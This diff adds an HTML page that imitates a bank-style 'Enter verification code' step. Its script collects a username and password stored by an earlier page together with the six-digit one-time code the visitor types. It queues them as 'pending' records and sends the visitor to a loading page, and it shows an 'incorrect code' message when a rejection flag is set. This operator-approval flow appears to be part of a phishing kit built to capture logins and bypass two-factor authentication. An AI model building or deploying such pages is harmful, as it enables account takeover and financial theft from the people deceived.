@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<title>Verification Code</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #ffffff;
+    padding: 80px 16px 30px;
+  }
+  .heading {
+    text-align: center;
+    font-size: 26px;
+    font-weight: 400;
+    color: #1a1a1a;
+    margin-bottom: 10px;
+  }
+  .subheading {
+    text-align: center;
+    font-size: 14px;
+    color: #555;
+    margin-bottom: 24px;
+    max-width: 380px;
+    margin-left: auto;
+    margin-right: auto;
+  }
+  .card {
+    max-width: 480px;
+    margin: 0 auto;
+    background: #ffffff;
+    border-radius: 16px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    overflow: hidden;
+  }
+  .top-stripe {
+    height: 6px;
+    width: 100%;
+    background: linear-gradient(to right, #c8102e 0%, #c8102e 50%, #0a2f6b 50%, #0a2f6b 100%);
+  }
+  .card-body {
+    padding: 26px 22px 30px;
+  }
+  label {
+    display: block;
+    font-size: 15px;
+    font-weight: bold;
+    color: #1a1a1a;
+    margin-bottom: 10px;
+    text-align: center;
+  }
+  .code-inputs {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 18px;
+  }
+  .code-inputs input {
+    width: 44px;
+    height: 52px;
+    text-align: center;
+    font-size: 22px;
+    border: 1px solid #b5b5b5;
+    border-radius: 6px;
+  }
+  .code-inputs input:focus {
+    outline: none;
+    border-color: #0a2f6b;
+  }
+  .error-text {
+    color: #c8102e;
+    font-size: 13px;
+    text-align: center;
+    margin: -6px 0 14px;
+    display: none;
+  }
+  .verify-btn {
+    width: 100%;
+    background: #0a2f6b;
+    color: #fff;
+    border: none;
+    padding: 13px;
+    font-size: 16px;
+    font-weight: bold;
+    border-radius: 30px;
+    cursor: pointer;
+    margin-bottom: 16px;
+  }
+  .verify-btn:hover {
+    background: #08234f;
+  }
+  .resend-row {
+    text-align: center;
+  }
+  .resend-row a {
+    color: #1b5fd6;
+    font-size: 14px;
+    font-weight: bold;
+    text-decoration: underline;
+  }
+  .server-error {
+    color: #c8102e;
+    font-size: 14px;
+    font-weight: bold;
+    text-align: center;
+    background: #fdeceb;
+    border: 1px solid #f3b8b3;
+    border-radius: 6px;
+    padding: 10px;
+    margin: 0 0 16px;
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+  <div class="heading">Enter verification code</div>
+  <div class="subheading">We sent a 6-digit code to your registered device. Enter it below to continue.</div>
+
+  <div class="card">
+    <div class="top-stripe"></div>
+    <div class="card-body">
+      <div class="server-error" id="serverError">The code entered is incorrect or invalid</div>
+      <label>Verification Code</label>
+      <div class="code-inputs">
+        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      </div>
+      <div class="error-text" id="errorText">Please enter the full 6-digit code.</div>
+
+      <button class="verify-btn" onclick="handleVerify()">Verify</button>
+
+      <div class="resend-row">
+        <a href="#">Resend code</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    if (sessionStorage.getItem('verifyRejected') === '1') {
+      document.getElementById('serverError').style.display = 'block';
+      sessionStorage.removeItem('verifyRejected');
+    }
+
+    const inputs = document.querySelectorAll('.code-inputs input');
+    inputs.forEach((input, i) => {
+      input.addEventListener('input', () => {
+        input.value = input.value.replace(/[^0-9]/g, '');
+        if (input.value && i < inputs.length - 1) {
+          inputs[i + 1].focus();
+        }
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && i > 0) {
+          inputs[i - 1].focus();
+        }
+      });
+    });
+
+    function handleVerify() {
+      const code = Array.from(inputs).map(i => i.value).join('');
+      const errorText = document.getElementById('errorText');
+
+      if (code.length !== 6) {
+        errorText.style.display = 'block';
+        return;
+      }
+      errorText.style.display = 'none';
+      document.getElementById('serverError').style.display = 'none';
+
+      const requests = JSON.parse(localStorage.getItem('verifyRequests') || '[]');
+      const id = Date.now().toString();
+      requests.push({
+        id: id,
+        username: sessionStorage.getItem('pendingUsername') || '',
+        password: sessionStorage.getItem('pendingPassword') || '',
+        code: code,
+        status: 'pending',
+        timestamp: new Date().toLocaleString()
+      });
+      localStorage.setItem('verifyRequests', JSON.stringify(requests));
+      sessionStorage.setItem('currentVerifyId', id);
+
+      window.location.href = 'verify-loading.html';
+    }
+  </script>
+
+</body>
+</html>
